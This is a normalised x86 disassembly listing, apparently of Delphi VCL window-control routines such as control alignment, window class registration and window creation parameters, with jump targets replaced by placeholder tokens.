mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_436465
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_4365f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_436623 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4366ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_436ea0
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413704
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_413860
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43626c
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_436e64
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_4138dc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_413860
mov edx eax
mov ecx ebx
mov eax edi
call sub_4361e0
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43681c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_436ea0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_436e64
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_436e64
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_436870
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43681c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43694f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4366ac
pop ecx
push ebp
mov al 0x2
call sub_4366ac
pop ecx
push ebp
mov al 0x3
call sub_4366ac
pop ecx
push ebp
mov al 0x4
call sub_4366ac
pop ecx
push ebp
mov al 0x5
call sub_4366ac
pop ecx
push ebp
mov al 0x6
call sub_4366ac
pop ecx
push ebp
xor eax eax
call sub_4366ac
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4032ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_436974
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a474
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436a08
xor eax eax
push ebp
push sub_4369fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_436a10
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_436a38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_436afd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_433374
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436b04
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_436e64
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413704
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4330e0
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413860
xor ecx ecx
mov edx 0xb03e
call sub_434b3c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_436e64
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_436b0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_436ea0
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_436a08
xor edx edx
push ebp
push sub_436bf3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436e64
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413704
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_413860
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f0
mov eax [ ebp - 0x4 ]
call sub_436a10
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436e64
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_432e84
mov dl 0x4
call sub_432e84
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413750
sub_436c60
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44a5dc
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_44e300
sub_436c80
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_432264
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_432264
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_432264
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_436ccc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43228c
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43228c
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43228c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_436d14
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4032ec
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_434b3c
mov edx ebx
mov eax edi
call sub_436c80
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_434b3c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_434b3c
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax edi
call sub_43a474
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_434b3c
mov eax edi
call sub_437864
jmp r-xdata
mov edx ebx
mov eax edi
call sub_436974
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436de8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_434b3c
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax esi
call sub_43a474
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_436c60
mov eax ebp
call sub_4376c8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_436ccc
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_434b3c
mov eax esi
call sub_436a30
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_433db8
sub_436e64
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_413860
mov edx edi
mov eax ebp
call sub_413860
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_436ec0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_436ea0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_436e64
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_436f00
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_436ec0
add esp 0x10
retn
sub_436f28
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_436f94
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_433fcc
test al al
je r-xdata
mov eax ebx
call sub_433ffc
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_4032ec
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4032ec
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4032ec
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_436ffc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43711a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b04
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_436f94
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_43a170
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403040
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404110
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4082fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437121
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_437128
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4372e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx r-xdata
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c5b8
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c5b8
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_4084b0
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_43a480
push 0x1
mov eax [ esi + 0x68 ]
call sub_41cb6c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_434b3c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_43a170
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4372f0
lea eax [ ebp - 0xc0 ]
call sub_403eac
retn
mov eax esi
mov si 0xffee
call sub_4032ec
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_4372f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4067fc
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_437338
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417a94
mov eax esi
call sub_4179e4
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_4179e4
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417a9c
pop esi
pop ebx
retn
sub_437370
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_4192e0
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41926c
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41926c
mov eax esi
call sub_4192e8
add esp 0x10
pop esi
pop ebx
retn
sub_4373d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_4373c4
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413860
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413860
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4374b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_434e74
mov eax [ ebp - 0x8 ]
push eax
push sub_437338
mov eax [ ebp - 0x8 ]
push eax
push sub_437370
push ebp
call sub_4373d8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43750c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4338e4
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408464
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408478
mov ecx eax
mov edx edi
mov eax ebx
call sub_4338f4
mov eax r-xdata
call sub_408484
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_432398
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_437564
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4375b1
push [ fs : eax ]
